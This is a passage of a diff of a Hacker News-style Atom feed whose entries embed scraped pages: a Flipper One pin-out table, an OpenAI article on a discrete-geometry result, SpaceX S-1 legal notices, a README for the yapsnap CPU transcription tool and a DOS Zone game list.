20 21 config 0 gpio 6 (i/o)(0/1 8v) 22 23 gpio 11 (i/o)(0/1 8v) gpio 7 (i/o)(0/1 8v) 24 25 dpr (o)(0/1 8v) gpio 10 (i/o)(0/1 8v) 26 27 gnd pla s2# (i)/gpio 8 (i/o)(0/1 8v) 28 29 pern1/usb3 1 rx /ssic rxn uim reset (i) 30 31 perp1/usb3 1 rx+/ssic rxp uim clk (i) 32 33 gnd uim data (i/o) 34 35 petn1/usb3 1 tx /ssic txn uim pwr (i) 36 37 petp1/usb3 1 tx+/ssic txp devslp (o) 38 39 gnd gpio 0 (i/o)/smb clk (i/o)/(0/1 8v) 40 41 pern0/sata b+ gpio 1 (i/o)/smb data (i/o)/(0/1 8v) 42 43 perp0/sata b gpio 2 (i/o)/alert# (i)(0/1 8v) 44 45 gnd gpio 3 (i/o)(0/1 8v) 46 47 petn0/sata a gpio 4 (i/o)(0/1 8v) 48 49 petp0/sata a+ perst# (o)(0/1 8v/3 3v) 50 51 gnd clkreq# (i/o)(0/1 8v/3 3v) 52 53 refclkn pewake# (i/o)(0/1 8v/3 3v) 54 55 refclkp nc 56 57 gnd nc 58 59 antctl0 (i)(0/1 8v) coex3 (i/o)(0/1 8v) 60 61 antctl1 (i)(0/1 8v) coex txd (o)(0/1 8v) 62 63 antctl2 (i)(0/1 8v) coex rxd (i)(0/1 8v) 64 65 antctl3 (i)(0/1 8v) sim detect (o) 66 67 reset# (o)(0/1 8v) susclk (o)(0/1 8v/3 3v) 68 69 config 1 3 3 v/vbat 70 71 gnd 3 3 v/vbat 72 73 vio cfg (i) or gnd 3 3 v/vbat 74 75 config 2 gpio pinout flipper one gpio port pinout description pin pin description 3 3 v power, up to 2a efuse 3v3 gnd ground mcu gpio 40 pio adc0 pwm8 a m40 m41 mcu gpio 41 pwm8 b adc0 pio cpu gpio4 b4 d spdif rx0 m0 i2c3 sda m0 uart2 rx m1 can1 rx m2 b4 b5 cpu gpio4 b5 d can1 tx m2 uart2 tx m1 i2c3 scl m0 spdif tx0 m0 cpu gpio4 b2 d sai1 sdo3 m0 sai1 sdi1 m0 pdm1 sdi1 m1 spi4 miso m2 b2 b3 cpu gpio4 b3 d pwm2 ch7 m0 spi3 csn1 m2 spi4 csn0 m2 pdm1 sdi0 m1 sai4 sd0 m0 sai1 sdi0 m0 cpu gpio4 b0 d sai1 sdo1 m0 sai1 sdi3 m0 pdm1 clk1 m1 spi4 clk m2 uart5 tx m1 uart6 rtsn m0 uart2 rtsn m1 b0 b1 cpu gpio4 b1 d uart2 ctsn m1 uart6 ctsn m0 uart5 rx m1 spi4 mosi m2 pdm1 sdi2 m1 sai1 sdi2 m0 sai1 sdo2 m0 cpu gpio4 a6 d sai4 lrck m0 pdm1 clk0 m1 spi3 miso m2 i2c4 sda m1 uart6 rx m0 can0 rx m2 a6 a7 cpu gpio4 a7 d pwm2 ch6 m0 spi3 clk m2 sai4 sdi1 m0 sai1 sdo0 m0 cpu gpio4 a4 d sai4 sclk m0 pdm1 sdi3 m1 spi3 mosi m2 i2c4 scl m1 uart6 tx m0 can0 tx m2 a4 a5 cpu gpio4 a5 d i2c2 sda m2 uart5 ctsn m1 spi4 csn1 m2 sai1 lrck m0 cpu gpio4 a2 d sai1 mclk m0 sai4 mclk m0 pwm2 ch5 m0 a2 a3 cpu gpio4 a3 d pwm2 ch4 m1 i2c2 scl m2 uart5 rtsn m1 spi3 csn0 m2 sai1 sclk m0 5v power, up to 2a efuse 5v gnd ground cpu usb 2 0 data+ d+ d cpu usb 2 0 data debug port pinout flipper one debug port pinout description pin pin description 3v3 ⚠️ mcu power 1 2 mcu reset mcu swd clock 3 4 mcu swd io mcu uart tx 5 6 mcu uart rx mcu gpio 41 7 8 mcu gpio 40 cpu reset 9 10 cpu uart0 tx cpu uart0 rx 11 12 cpu gpio0 d2 cpu gpio0 d3 13 14 gnd &lt;/p&gt;
@@ -270,7 +397,7 @@
     &lt;p&gt;To ask a question or participate in discussions, you'll need to authenticate first.&lt;/p&gt;
   &lt;/main&gt;
   &lt;comments/&gt;
-&lt;/doc&gt;</content><link href="https://docs.flipper.net/one/general/tech-specs"/><published>2026-05-20T18:33:56+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48212493</id><title>An OpenAI model has disproved a central conjecture in discrete geometry</title><updated>2026-05-21T06:32:03.852021+00:00</updated><content>&lt;doc fingerprint="ad4b821500868f73"&gt;
+&lt;/doc&gt;</content><link href="https://docs.flipper.net/one/general/tech-specs"/><published>2026-05-20T18:33:56+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48212493</id><title>An OpenAI model has disproved a central conjecture in discrete geometry</title><updated>2026-05-21T10:28:35.973438+00:00</updated><content>&lt;doc fingerprint="ad4b821500868f73"&gt;
   &lt;main&gt;
     &lt;head rend="h1"&gt;An OpenAI model has disproved a central conjecture in discrete geometry&lt;/head&gt;
     &lt;p&gt;For nearly 80 years, mathematicians have studied a deceptively simple question: if you place points in the plane, how many pairs of points can be exactly distance apart?&lt;/p&gt;
@@ -297,305 +424,17 @@
     &lt;p&gt;That future still depends on human judgment. Expertise becomes more valuable, not less. AI can help search, suggest, and verify. People choose the problems that matter, interpret the results, and decide what questions to pursue next.&lt;/p&gt;
   &lt;/main&gt;
   &lt;comments/&gt;
-&lt;/doc&gt;</content><link href="https://openai.com/index/model-disproves-discrete-geometry-conjecture/"/><published>2026-05-20T19:05:30+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48213651</id><title>Colorado Amended SB051 (Age Verification Bill) to Exclude Open Source Projects</title><updated>2026-05-21T06:32:03.762211+00:00</updated><content/><link href="https://legiscan.com/CO/bill/SB051/2026"/><published>2026-05-20T20:28:18+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48213933</id><title>SpaceX S-1</title><updated>2026-05-21T06:31:57.831288+00:00</updated><content>India
-
-This prospectus has not been and will not be registered as a prospectus with any registrar of companies in India. This
-
-prospectus has not been and will not be reviewed or approved by any regulatory authority in India, including the
-
-Securities and Exchange Board of India, any registrar of companies in India or any stock exchange in India. This
-
-prospectus and this offering of the shares of Class A common stock are not and should not be construed as an
-
-invitation, offer or sale of any securities to the public in India. Other than in compliance with the private placement
-
-exemptions under applicable laws and regulations in India, including the Companies Act, 2013, as amended, the
-
-shares of Class A common stock have not been, and will not be, offered or sold to the public or any member of the
-
-public in India. This prospectus is strictly personal to the recipient and neither this prospectus nor the offering of the
-
-shares of Class A common stock is calculated to result, directly or indirectly, in the shares of Class A common stock
-
-becoming available for subscription or purchase by persons other than those receiving the invitation or offer. Each
-
-investor is deemed to have acknowledged, represented and agreed that it is eligible to invest in the shares of Class A
-
-common stock under applicable laws, rules and regulations in India, without the requirement to obtain any prior
-
-approval, and that it is not prohibited or prevented under any law, rule or regulation in India from acquiring, owning
-
-or selling the shares of Class A common stock.
-
-Indonesia
-
-This prospectus does not, and is not intended to, constitute a public offering in Indonesia under Law Number 8 of
-
-1995 regarding Capital Market. This prospectus may not be distributed in the Republic of Indonesia and the shares
-
-of Class A common stock may not be offered or sold in the Republic of Indonesia or to Indonesian citizens wherever
-
-they are domiciled, or to Indonesia residents, in a manner which constitutes a public offering under the laws of the
-
-Republic of Indonesia.
-
-Israel
-
-In the State of Israel this prospectus shall not be regarded as an offer to the public to purchase shares of Class A
-
-common stock under the Israeli Securities Law, 5728—1968, which requires a prospectus to be published and
-
-authorized by the Israel Securities Authority, if it complies with certain provisions of Section 15 of the Israeli
-
-Securities Law, 5728–1968, including, inter alia, if: (i) the offer is made, distributed or directed to not more than 35
-
-investors, subject to certain conditions (the “Addressed Investors”), or (ii) the offer is made, distributed or directed
-
-to certain qualified investors defined in the First Addendum of the Israeli Securities Law, 5728—1968, subject to
-
-certain conditions (the “Qualified Investors”). The Qualified Investors shall not be taken into account in the count of
-
-the Addressed Investors and may be offered to purchase securities in addition to the 35 Addressed Investors. We
-
-have not and will not take any action that would require it to publish a prospectus in accordance with and subject to
-
-the Israeli Securities Law, 5728—1968. We have not and will not distribute this prospectus or make, distribute or
-
-direct an offer to subscribe for our Class A common stock to any person within the State of Israel, other than to
-
-Qualified Investors and up to 35 Addressed Investors.
-
-Qualified Investors may have to submit written evidence that they meet the definitions set out in of the First
-
-Addendum to the Israeli Securities Law, 5728—1968. In particular, we may request, as a condition to be offered
-
-shares of Class A common stock, that Qualified Investors will each represent, warrant and certify to us and/or to
-
-anyone acting on our behalf: (i) that it is an investor falling within one of the categories listed in the First Addendum
-
-to the Israeli Securities Law, 5728—1968; (ii) which of the categories listed in the First Addendum to the Israeli
-
-Securities Law, 5728—1968 regarding Qualified Investors is applicable to it; (iii) that it will abide by all provisions
-
-set forth in the Israeli Securities Law, 5728—1968 and the regulations promulgated thereunder in connection with
-
-the offer to be issued shares of Class A common stock; (iv) that the shares of Class A common stock that it will be
-
-issued are, subject to exemptions available under the Israeli Securities Law, 5728—1968: (a) for its own account; (b)
-
-for investment purposes only; and (c) not issued with a view to resale within the State of Israel, other than in
-
-accordance with the provisions of the Israeli Securities Law, 5728—1968; and (v) that it is willing to provide further
-
-evidence of its Qualified Investor status. Addressed Investors may have to submit written evidence in respect of their
-
-identity and may have to sign and submit a declaration containing, inter alia, the Addressed Investor’s name, address</content><link href="https://www.sec.gov/Archives/edgar/data/1181412/000162828026036936/spaceexplorationtechnologi.htm"/><published>2026-05-20T20:49:59+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48214017</id><title>Anthropic is expanding to Colossus2. Will use GB200</title><updated>2026-05-21T06:31:57.255269+00:00</updated><content>&lt;doc fingerprint="d635e49f34142863"&gt;
+&lt;/doc&gt;</content><link href="https://openai.com/index/model-disproves-discrete-geometry-conjecture/"/><published>2026-05-20T19:05:30+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48214017</id><title>Anthropic is expanding to Colossus2. Will use GB200</title><updated>2026-05-21T10:28:35.609917+00:00</updated><content>&lt;doc fingerprint="d635e49f34142863"&gt;
   &lt;main&gt;
     &lt;p&gt;We’ve detected that JavaScript is disabled in this browser. Please enable JavaScript or switch to a supported browser to continue using x.com. You can see a list of supported browsers in our Help Center.&lt;/p&gt;
     &lt;p&gt;Help Center&lt;/p&gt;
     &lt;p&gt;Terms of Service Privacy Policy Cookie Policy Imprint Ads info © 2026 X Corp.&lt;/p&gt;
   &lt;/main&gt;
   &lt;comments/&gt;
-&lt;/doc&gt;</content><link href="https://twitter.com/nottombrown/status/2057194829986300375"/><published>2026-05-20T20:55:52+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48214399</id><title>Show HN: CPU-only transcription for YouTube, TikTok, X, Instagram videos</title><updated>2026-05-21T06:31:56.610910+00:00</updated><content>&lt;doc fingerprint="1e14ce9b01683aa3"&gt;
-  &lt;main&gt;
-    &lt;quote&gt;
-      &lt;p&gt;Snap any video URL or audio file into plaintext. No GPU. No cloud. One command.&lt;/p&gt;
-    &lt;/quote&gt;
-    &lt;code&gt;yapsnap "https://www.youtube.com/watch?v=dQw4w9WgXcQ"&lt;/code&gt;
-    &lt;p&gt;That's it. You get a &lt;code&gt;.txt&lt;/code&gt; next to your shell, transcribed on your CPU, in less time than it took the video to play.&lt;/p&gt;
-    &lt;list rend="ul"&gt;
-      &lt;item&gt;⚡ Fast on CPU. Streaming Zipformer transducer (Kroko English) chews through audio at several times realtime on a laptop. No CUDA. No M-series-only tricks. Plain old cores.&lt;/item&gt;
-      &lt;item&gt;🌐 Any video URL, plus local files. YouTube. X. TikTok. Instagram Reels. Direct &lt;code&gt;.mp4&lt;/code&gt;/&lt;code&gt;.mp3&lt;/code&gt;links. Or just point it at a file on disk. yt-dlp handles the fetch, ffmpeg handles the decode, the rest is yours.&lt;/item&gt;
-      &lt;item&gt;📴 Offline after first run. ~80 MB model downloads once to your cache and stays there. No API keys. No quotas. Your audio never leaves your machine.&lt;/item&gt;
-      &lt;item&gt;🪶 One file, three deps. &lt;code&gt;sherpa-onnx&lt;/code&gt;,&lt;code&gt;numpy&lt;/code&gt;,&lt;code&gt;yt-dlp&lt;/code&gt;. The whole tool is a single Python module.&lt;/item&gt;
-      &lt;item&gt;🗣 Ten-plus languages. English out of the box; French, German, Spanish, Italian, Portuguese, Dutch, Swedish, Swiss German, Hebrew, and Turkish are a one-line &lt;code&gt;--model&lt;/code&gt;swap away. See Other languages.&lt;/item&gt;
-      &lt;item&gt;⏱ Sentence-level timestamps when you want them. &lt;code&gt;--timestamps&lt;/code&gt;adds&lt;code&gt;[MM:SS]&lt;/code&gt;per sentence using Kroko's built-in punctuation. Timing stays correct even when you transcribe at 2x.&lt;/item&gt;
-    &lt;/list&gt;
-    &lt;code&gt;# 1. ffmpeg on PATH (one-time, per OS — see below)
-# 2. Install
-pip install .
-
-# 3. Snap something
-yapsnap https://www.tiktok.com/@user/video/7234567890123456789
-yapsnap meeting.mp4 --timestamps
-yapsnap podcast.mp3 -o ~/notes/episode.txt&lt;/code&gt;
-    &lt;p&gt;The first run downloads the model (~80 MB). Every run after is offline.&lt;/p&gt;
-    &lt;p&gt;Any URL &lt;code&gt;yt-dlp&lt;/code&gt; understands works. The big ones:&lt;/p&gt;
-    &lt;table&gt;
-      &lt;row span="2"&gt;
-        &lt;cell role="head"&gt;Source&lt;/cell&gt;
-        &lt;cell role="head"&gt;Example&lt;/cell&gt;
-      &lt;/row&gt;
-      &lt;row span="2"&gt;
-        &lt;cell&gt;YouTube&lt;/cell&gt;
-        &lt;cell&gt;
-          &lt;code&gt;https://www.youtube.com/watch?v=...&lt;/code&gt;
-        &lt;/cell&gt;
-      &lt;/row&gt;
-      &lt;row span="2"&gt;
-        &lt;cell&gt;YouTube Shorts&lt;/cell&gt;
-        &lt;cell&gt;
-          &lt;code&gt;https://www.youtube.com/shorts/...&lt;/code&gt;
-        &lt;/cell&gt;
-      &lt;/row&gt;
-      &lt;row span="2"&gt;
-        &lt;cell&gt;X / Twitter&lt;/cell&gt;
-        &lt;cell&gt;
-          &lt;code&gt;https://x.com/user/status/.../video/1&lt;/code&gt;
-        &lt;/cell&gt;
-      &lt;/row&gt;
-      &lt;row span="2"&gt;
-        &lt;cell&gt;TikTok&lt;/cell&gt;
-        &lt;cell&gt;
-          &lt;code&gt;https://www.tiktok.com/@user/video/...&lt;/code&gt;
-        &lt;/cell&gt;
-      &lt;/row&gt;
-      &lt;row span="2"&gt;
-        &lt;cell&gt;Instagram Reels&lt;/cell&gt;
-        &lt;cell&gt;
-          &lt;code&gt;https://www.instagram.com/reel/.../&lt;/code&gt;
-        &lt;/cell&gt;
-      &lt;/row&gt;
-      &lt;row&gt;
-        &lt;cell&gt;Direct media URL&lt;/cell&gt;
-        &lt;cell&gt;
-          &lt;code&gt;https://example.com/clip.mp4&lt;/code&gt;
-        &lt;/cell&gt;
-      &lt;/row&gt;
-    &lt;/table&gt;
-    &lt;p&gt;Plus any local file ffmpeg can decode: &lt;code&gt;.mp3&lt;/code&gt;, &lt;code&gt;.mp4&lt;/code&gt;, &lt;code&gt;.m4a&lt;/code&gt;, &lt;code&gt;.wav&lt;/code&gt;, &lt;code&gt;.webm&lt;/code&gt;, &lt;code&gt;.mov&lt;/code&gt;, &lt;code&gt;.mkv&lt;/code&gt;, &lt;code&gt;.aac&lt;/code&gt;, &lt;code&gt;.opus&lt;/code&gt;, &lt;code&gt;.ogg&lt;/code&gt;, &lt;code&gt;.flac&lt;/code&gt;, and friends.&lt;/p&gt;
-    &lt;table&gt;
-      &lt;row span="2"&gt;
-        &lt;cell role="head"&gt;OS&lt;/cell&gt;
-        &lt;cell role="head"&gt;Command&lt;/cell&gt;
-      &lt;/row&gt;
-      &lt;row span="2"&gt;
-        &lt;cell&gt;macOS&lt;/cell&gt;
-        &lt;cell&gt;
-          &lt;code&gt;brew install ffmpeg&lt;/code&gt;
-        &lt;/cell&gt;
-      &lt;/row&gt;
-      &lt;row span="2"&gt;
-        &lt;cell&gt;Linux&lt;/cell&gt;
-        &lt;cell&gt;&lt;code&gt;sudo apt install ffmpeg&lt;/code&gt; or &lt;code&gt;sudo dnf install ffmpeg&lt;/code&gt;&lt;/cell&gt;
-      &lt;/row&gt;
-      &lt;row&gt;
-        &lt;cell&gt;Windows&lt;/cell&gt;
-        &lt;cell&gt;&lt;code&gt;winget install ffmpeg&lt;/code&gt; or &lt;code&gt;choco install ffmpeg&lt;/code&gt;&lt;/cell&gt;
-      &lt;/row&gt;
-    &lt;/table&gt;
-    &lt;code&gt;pip install .&lt;/code&gt;
-    &lt;p&gt;Installs two equivalent commands on your &lt;code&gt;PATH&lt;/code&gt;: &lt;code&gt;yapsnap&lt;/code&gt; (canonical) and &lt;code&gt;transcribe&lt;/code&gt; (alias, for when the name slips your mind).&lt;/p&gt;
-    &lt;code&gt;# Local file
-yapsnap path/to/audio.mp3
-
-# Any video URL
-yapsnap "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
-
-# Sentence-level timestamps
-yapsnap input.mp4 --timestamps
-
-# Custom output path
-yapsnap input.mp4 -o ./transcripts/talk.txt
-
-# Don't speed audio up before transcribing (default is 1.5x, pitch preserved)
-yapsnap input.mp4 --speed 1.0
-
-# Keep the downloaded audio (URL inputs only)
-yapsnap "https://..." --keep-audio&lt;/code&gt;
-    &lt;p&gt;Plaintext, UTF-8. Default location is &lt;code&gt;./transcripts/&lt;/code&gt; (created if missing) under the current working directory; override with &lt;code&gt;-o&lt;/code&gt;. For URL inputs the filename is derived from the video ID (&lt;code&gt;dQw4w9WgXcQ_transcript.txt&lt;/code&gt;, etc.).&lt;/p&gt;
-    &lt;p&gt;Without &lt;code&gt;--timestamps&lt;/code&gt; — one paragraph of recognized text:&lt;/p&gt;
-    &lt;code&gt;Welcome to the show. Today we're talking about transcription. Let's get started.
-&lt;/code&gt;
-    &lt;p&gt;With &lt;code&gt;--timestamps&lt;/code&gt; — one sentence per line, timed against the original audio:&lt;/p&gt;
-    &lt;code&gt;[00:00] Welcome to the show.
-[00:03] Today we're talking about transcription.
-[00:08] Let's get started.
-&lt;/code&gt;
-    &lt;p&gt;Timestamps stay in original-audio time even at &lt;code&gt;--speed 1.5&lt;/code&gt; or higher.&lt;/p&gt;
-    &lt;table&gt;
-      &lt;row span="2"&gt;
-        &lt;cell role="head"&gt;Flag&lt;/cell&gt;
-        &lt;cell role="head"&gt;Description&lt;/cell&gt;
-      &lt;/row&gt;
-      &lt;row span="2"&gt;
-        &lt;cell&gt;&lt;code&gt;-o&lt;/code&gt;, &lt;code&gt;--output&lt;/code&gt;&lt;/cell&gt;
-        &lt;cell&gt;Output &lt;code&gt;.txt&lt;/code&gt; path. Default: &lt;code&gt;./transcripts/&amp;lt;input&amp;gt;_transcript.txt&lt;/code&gt;.&lt;/cell&gt;
-      &lt;/row&gt;
-      &lt;row span="2"&gt;
-        &lt;cell&gt;
-          &lt;code&gt;--timestamps&lt;/code&gt;
-        &lt;/cell&gt;
-        &lt;cell&gt;Emit &lt;code&gt;[MM:SS] sentence.&lt;/code&gt; lines instead of a single paragraph.&lt;/cell&gt;
-      &lt;/row&gt;
-      &lt;row span="2"&gt;
-        &lt;cell&gt;
-          &lt;code&gt;--speed&lt;/code&gt;
-        &lt;/cell&gt;
-        &lt;cell&gt;Pre-transcription speedup factor, pitch preserved. Default &lt;code&gt;1.5&lt;/code&gt;.&lt;/cell&gt;
-      &lt;/row&gt;
-      &lt;row span="2"&gt;
-        &lt;cell&gt;
-          &lt;code&gt;--keep-audio&lt;/code&gt;
-        &lt;/cell&gt;
-        &lt;cell&gt;Keep the downloaded audio (URL inputs only).&lt;/cell&gt;
-      &lt;/row&gt;
-      &lt;row&gt;
-        &lt;cell&gt;
-          &lt;code&gt;--model&lt;/code&gt;
-        &lt;/cell&gt;
-        &lt;cell&gt;Override the model directory. Also reads &lt;code&gt;KROKO_MODEL&lt;/code&gt; env var.&lt;/cell&gt;
-      &lt;/row&gt;
-    &lt;/table&gt;
-    &lt;list rend="ol"&gt;
-      &lt;item&gt;Fetch. If the input is a URL, &lt;code&gt;yt-dlp&lt;/code&gt;grabs the best audio-only stream to a temp directory. If it's a local path, this step is skipped.&lt;/item&gt;
-      &lt;item&gt;Decode. &lt;code&gt;ffmpeg&lt;/code&gt;pipes the media into 16 kHz mono PCM. The optional&lt;code&gt;atempo&lt;/code&gt;filter speeds it up without raising pitch.&lt;/item&gt;
-      &lt;item&gt;Recognize. A streaming Zipformer2 transducer (Kroko English, INT8 ONNX, ~80 MB) eats the PCM in chunks. CPU-only. Greedy decode.&lt;/item&gt;
-      &lt;item&gt;Format. Plain text by default. With &lt;code&gt;--timestamps&lt;/code&gt;, token timestamps are grouped on&lt;code&gt;.!?&lt;/code&gt;into sentences and scaled back to original-audio time.&lt;/item&gt;
-    &lt;/list&gt;
-    &lt;p&gt;No frame is sent anywhere. No state is kept between runs except the cached model.&lt;/p&gt;
-    &lt;p&gt;The default Kroko English model is downloaded on first run to:&lt;/p&gt;
-    &lt;list rend="ul"&gt;
-      &lt;item&gt;macOS — &lt;code&gt;~/Library/Caches/yapsnap/&lt;/code&gt;&lt;/item&gt;
-      &lt;item&gt;Linux — &lt;code&gt;$XDG_CACHE_HOME/yapsnap/&lt;/code&gt;(or&lt;code&gt;~/.cache/yapsnap/&lt;/code&gt;)&lt;/item&gt;
-      &lt;item&gt;Windows — &lt;code&gt;%LOCALAPPDATA%\yapsnap\&lt;/code&gt;&lt;/item&gt;
-    &lt;/list&gt;
-    &lt;p&gt;To use a different streaming transducer (other languages, larger Kroko variants, etc.), point &lt;code&gt;--model&lt;/code&gt; at a directory containing &lt;code&gt;encoder(.int8).onnx&lt;/code&gt;, &lt;code&gt;decoder(.int8).onnx&lt;/code&gt;, &lt;code&gt;joiner(.int8).onnx&lt;/code&gt;, and &lt;code&gt;tokens.txt&lt;/code&gt;. Or set &lt;code&gt;KROKO_MODEL&lt;/code&gt; in your environment.&lt;/p&gt;
-    &lt;p&gt;The default model is English, but yapsnap isn't limited to it. To transcribe another language, just download the matching model and point yapsnap at it — no code changes, no reinstall.&lt;/p&gt;
-    &lt;p&gt;Kroko publishes streaming models for a growing list of languages on Hugging Face: https://huggingface.co/Banafo/Kroko-ASR/tree/main. As of now that includes:&lt;/p&gt;
-    &lt;list rend="ul"&gt;
-      &lt;item&gt;Dutch&lt;/item&gt;
-      &lt;item&gt;French&lt;/item&gt;
-      &lt;item&gt;German&lt;/item&gt;
-      &lt;item&gt;Hebrew&lt;/item&gt;
-      &lt;item&gt;Italian&lt;/item&gt;
-      &lt;item&gt;Portuguese&lt;/item&gt;
-      &lt;item&gt;Spanish&lt;/item&gt;
-      &lt;item&gt;Swedish&lt;/item&gt;
-      &lt;item&gt;Swiss German&lt;/item&gt;
-      &lt;item&gt;Turkish&lt;/item&gt;
-    &lt;/list&gt;
-    &lt;p&gt;Download the one you need, unpack it into its own folder, and run:&lt;/p&gt;
-    &lt;code&gt;# Per-run: pass the model folder explicitly
-yapsnap interview.mp3 --model /path/to/kroko-french
-
-# Or set it once as your default for the session
-export KROKO_MODEL=/path/to/kroko-french
-yapsnap interview.mp3&lt;/code&gt;
-    &lt;p&gt;Each model is single-language, so to work across several languages keep them in separate folders and switch with &lt;code&gt;--model&lt;/code&gt; (or re-export &lt;code&gt;KROKO_MODEL&lt;/code&gt;) as you go. Any other sherpa-onnx streaming transducer with the standard &lt;code&gt;encoder&lt;/code&gt; / &lt;code&gt;decoder&lt;/code&gt; / &lt;code&gt;joiner&lt;/code&gt; / &lt;code&gt;tokens.txt&lt;/code&gt; layout works too, not just the Kroko ones.&lt;/p&gt;
-    &lt;list rend="ul"&gt;
-      &lt;item&gt;The default model is English. For other languages, download a matching model and pass it with &lt;code&gt;--model&lt;/code&gt;— see Other languages for the current list and instructions.&lt;/item&gt;
-      &lt;item&gt;&lt;code&gt;--speed 1.5&lt;/code&gt;shaves about a third off transcription time with minimal accuracy cost. Try&lt;code&gt;2.0&lt;/code&gt;if you want it even faster, or&lt;code&gt;1.0&lt;/code&gt;for noisy, mumbled, or fast-speech sources.&lt;/item&gt;
-      &lt;item&gt;Some social-media URLs are geo-locked or login-walled; &lt;code&gt;yt-dlp&lt;/code&gt;will say so explicitly.&lt;/item&gt;
-      &lt;item&gt;This is a streaming model, so timestamps come from token positions in the recognized stream. They're accurate enough for navigation, not for subtitling-grade alignment.&lt;/item&gt;
-    &lt;/list&gt;
-    &lt;p&gt;Apache-2.0 for this project. The Kroko model is distributed under its own license — see https://huggingface.co/Banafo/Kroko-ASR. Powered by sherpa-onnx and yt-dlp.&lt;/p&gt;
-  &lt;/main&gt;
-  &lt;comments/&gt;
-&lt;/doc&gt;</content><link href="https://github.com/kouhxp/yapsnap"/><published>2026-05-20T21:28:28+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48215418</id><title>DOS Zone</title><updated>2026-05-21T06:31:55.065751+00:00</updated><content>&lt;doc fingerprint="734217f860a6cd5"&gt;
+&lt;/doc&gt;</content><link href="https://twitter.com/nottombrown/status/2057194829986300375"/><published>2026-05-20T20:55:52+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48215418</id><title>DOS Zone</title><updated>2026-05-21T10:28:33.887300+00:00</updated><content>&lt;doc fingerprint="734217f860a6cd5"&gt;
   &lt;main&gt;&lt;head rend="h2"&gt;Ultimate collection of online dos games&lt;/head&gt;&lt;p&gt;We support Mobile and offline games!&lt;/p&gt;&lt;p&gt;3Dfx&lt;/p&gt;3D Action (67) 4X (5) Action (883) Adventure (275) Arcade (220) Beat'em up (11) Board (155) Card (20) Chess (10) Compilation (1) Dungeon Crawler (29) Economic (36) Educational (147) Fighting (49) First Person Shooter (76) Full Motion Video (2) Games for Windows (73) IBM PC (1996) Management (36) MS-DOS (2049) Other-sim (1) Platformer (190) Puzzle (284) Quest (130) Racing (105) Real Time Strategy (55) RPG (121) Shoot'em up (93) Simulator (210) Space (12) Sport (149) Strategy (347) Text-based (83) Third Person Shooter (12) Turn Based RPG (25) Turn Based Strategy (44) Wargame (8) Windows 3.1 (11) Windows 95 (72) Windows 98 (4) Benchmarks&lt;p&gt;We support Mobile and offline games!&lt;/p&gt;&lt;p&gt;28567&lt;/p&gt;&lt;p&gt;2002&lt;/p&gt;&lt;p&gt;7891&lt;/p&gt;&lt;p&gt;1998&lt;/p&gt;&lt;p&gt;3241&lt;/p&gt;&lt;p&gt;1995&lt;/p&gt;&lt;p&gt;2599&lt;/p&gt;&lt;p&gt;1999&lt;/p&gt;&lt;p&gt;2039&lt;/p&gt;&lt;p&gt;1995&lt;/p&gt;&lt;p&gt;1859&lt;/p&gt;&lt;p&gt;1997&lt;/p&gt;&lt;p&gt;1754&lt;/p&gt;&lt;p&gt;1735&lt;/p&gt;&lt;p&gt;2000&lt;/p&gt;&lt;p&gt;1559&lt;/p&gt;&lt;p&gt;1993&lt;/p&gt;&lt;p&gt;1390&lt;/p&gt;&lt;p&gt;1999&lt;/p&gt;&lt;p&gt;1345&lt;/p&gt;&lt;p&gt;1044&lt;/p&gt;&lt;p&gt;702&lt;/p&gt;&lt;p&gt;2004&lt;/p&gt;&lt;p&gt;682&lt;/p&gt;&lt;p&gt;649&lt;/p&gt;&lt;p&gt;1999&lt;/p&gt;&lt;p&gt;562&lt;/p&gt;&lt;p&gt;1992&lt;/p&gt;&lt;p&gt;538&lt;/p&gt;&lt;p&gt;2024&lt;/p&gt;&lt;p&gt;528&lt;/p&gt;&lt;p&gt;1994&lt;/p&gt;&lt;p&gt;461&lt;/p&gt;&lt;p&gt;1997&lt;/p&gt;&lt;p&gt;376&lt;/p&gt;&lt;p&gt;1992&lt;/p&gt;&lt;p&gt;373&lt;/p&gt;&lt;p&gt;1996&lt;/p&gt;&lt;p&gt;362&lt;/p&gt;&lt;p&gt;340&lt;/p&gt;&lt;p&gt;2024&lt;/p&gt;&lt;p&gt;325&lt;/p&gt;&lt;p&gt;1996&lt;/p&gt;&lt;p&gt;273&lt;/p&gt;&lt;p&gt;239&lt;/p&gt;&lt;p&gt;230&lt;/p&gt;&lt;p&gt;1995&lt;/p&gt;&lt;p&gt;224&lt;/p&gt;&lt;p&gt;1991&lt;/p&gt;&lt;p&gt;197&lt;/p&gt;&lt;p&gt;1997&lt;/p&gt;&lt;p&gt;191&lt;/p&gt;&lt;p&gt;1997&lt;/p&gt;&lt;p&gt;190&lt;/p&gt;&lt;p&gt;189&lt;/p&gt;&lt;p&gt;1994&lt;/p&gt;&lt;p&gt;184&lt;/p&gt;&lt;p&gt;174&lt;/p&gt;&lt;p&gt;1997&lt;/p&gt;&lt;p&gt;173&lt;/p&gt;&lt;p&gt;1990&lt;/p&gt;&lt;p&gt;171&lt;/p&gt;&lt;p&gt;1991&lt;/p&gt;&lt;p&gt;152&lt;/p&gt;&lt;p&gt;1996&lt;/p&gt;&lt;p&gt;140&lt;/p&gt;&lt;p&gt;1996&lt;/p&gt;&lt;p&gt;133&lt;/p&gt;&lt;p&gt;2025&lt;/p&gt;&lt;p&gt;130&lt;/p&gt;&lt;p&gt;119&lt;/p&gt;&lt;p&gt;1995&lt;/p&gt;&lt;p&gt;105&lt;/p&gt;&lt;p&gt;1993&lt;/p&gt;&lt;p&gt;98&lt;/p&gt;&lt;p&gt;1989&lt;/p&gt;&lt;p&gt;96&lt;/p&gt;&lt;p&gt;1996&lt;/p&gt;&lt;p&gt;88&lt;/p&gt;&lt;p&gt;1998&lt;/p&gt;&lt;p&gt;87&lt;/p&gt;&lt;p&gt;1993&lt;/p&gt;&lt;p&gt;84&lt;/p&gt;&lt;p&gt;2024&lt;/p&gt;&lt;p&gt;84&lt;/p&gt;&lt;p&gt;1999&lt;/p&gt;&lt;p&gt;81&lt;/p&gt;&lt;p&gt;81&lt;/p&gt;&lt;p&gt;1994&lt;/p&gt;&l